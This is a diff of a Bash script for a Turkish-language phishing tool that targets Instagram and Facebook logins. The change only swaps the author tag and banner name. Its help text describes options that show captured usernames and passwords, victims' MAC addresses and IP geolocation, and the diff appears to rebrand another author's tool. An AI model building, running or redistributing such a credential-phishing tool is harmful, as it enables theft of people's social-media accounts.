@@ -1,6 +1,6 @@
 #!/bin/bash
 #!/bin/sh
-#Code:xBowtie
+#Code:azatbgrhn
 clear
 case $1 in
 
@@ -12,7 +12,7 @@ case $1 in
 --user         (Giriş Yapılmış Username & Pass)
 --mac          (Giriş Yapanların Mac Adresleri)
 --location     (Belirtilen Ip Adresinin Yer Tespiti)
-bash xbowtie.sh & sh xbowtie.sh (Phishing Toolu 'nu Çalıştırır)
+bash azatbgrhn.sh & sh azatbgrhn.sh (Phishing Toolu 'nu Çalıştırır)
    "
   ;;
 
@@ -24,7 +24,7 @@ bash xbowtie.sh & sh xbowtie.sh (Phishing Toolu 'nu Çalıştırır)
 --user         (Giriş Yapılmış Username & Pass)
 --mac          (Giriş Yapanların Mac Adresleri)
 --location     (Belirtilen Ip Adresinin Yer Tespiti)
-bash xbowtie.sh & sh xbowtie.sh (Phishing Toolu 'nu Çalıştırır)"
+bash azatbgrhn.sh & sh azatbgrhn.sh (Phishing Toolu 'nu Çalıştırır)"
 
   ;;
 
@@ -59,9 +59,9 @@ echo -e '\033[31;40;1m
 	────────────────────────────────────────
 	────────────────█████████───────────────
 	──────────────█████████████─────────────
-	   \e[35m☾★ ☾★ ☾★ ☾★ xBowtie ☾★ ☾★ ☾★ ☾★	
-	 \e[31m☾★ ☾★ ☾★ ☾★ xBowtie ☾★ ☾★ ☾★ ☾★	
-  \e[32m☾★ ☾★ ☾★ ☾★ xBowtie ☾★ ☾★ ☾★ ☾★	
+	   \e[35m☾★ ☾★ ☾★ ☾★ azatbugrahan ☾★ ☾★ ☾★ ☾★	
+	   \e[31m☾★ ☾★ ☾★ ☾★ azatbugrahan ☾★ ☾★ ☾★ ☾★	
+           \e[32m☾★ ☾★ ☾★ ☾★ azatbugrahan ☾★ ☾★ ☾★ ☾★	
 '
 echo -e '
 \e[31m[01]\e[32mİnstagram			\e[31m[04]\e[32mFacebook
